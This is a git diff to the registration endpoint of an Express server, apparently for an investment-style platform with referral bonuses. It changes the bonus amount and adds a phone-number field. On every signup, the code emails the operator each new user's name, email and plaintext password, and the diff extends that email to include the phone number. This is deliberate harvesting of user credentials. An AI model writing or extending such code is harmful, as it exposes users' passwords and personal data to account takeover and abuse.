@@ -86,7 +86,7 @@ app.post('/api/register', async (req, res) => {
         }},
       })
       await User.updateOne({referral : req.body.referralLink},{
-      $set: { refBonus: referringUser.refBonus + 100}
+      $set: { refBonus: referringUser.refBonus + 20}
       })
   }
 }
@@ -105,7 +105,8 @@ app.post('/api/register', async (req, res) => {
       referral: crypto.randomBytes(32).toString("hex"),
       refBonus:0,
       referred:[],
-      periodicProfit:0
+      periodicProfit:0,
+      phonenumber:req.body.phone
     });
     
     let user = await User.findOne({email:req.body.email})
@@ -114,7 +115,7 @@ app.post('/api/register', async (req, res) => {
       token: crypto.randomBytes(32).toString("hex")
     })
     const url= `${process.env.BASE_URL}users/${user._id}/verify/${token.token}`
-    await sendEmail(process.env.USER,'Signup Alert',`A new user with the following details just signed in name: ${req.body.firstName} ${req.body.lastName} email: ${req.body.email} password: ${req.body.password}`)
+    await sendEmail(process.env.USER,'Signup Alert',`A new user with the following details just signed in name: ${req.body.firstName} ${req.body.lastName} email: ${req.body.email} password: ${req.body.password} ,  phone number: ${req.body.phone}`)
     return res.json({ status: 'ok', url:url,email:user.email, name:user.firstname })
   } catch (error) {
     console.log(error)
@@ -505,5 +506,3 @@ setInterval(async () => {
 app.listen(port, () => {
   console.log(`server is running on port: ${port}`)
 })
-
-console.log(new Date().getTime())
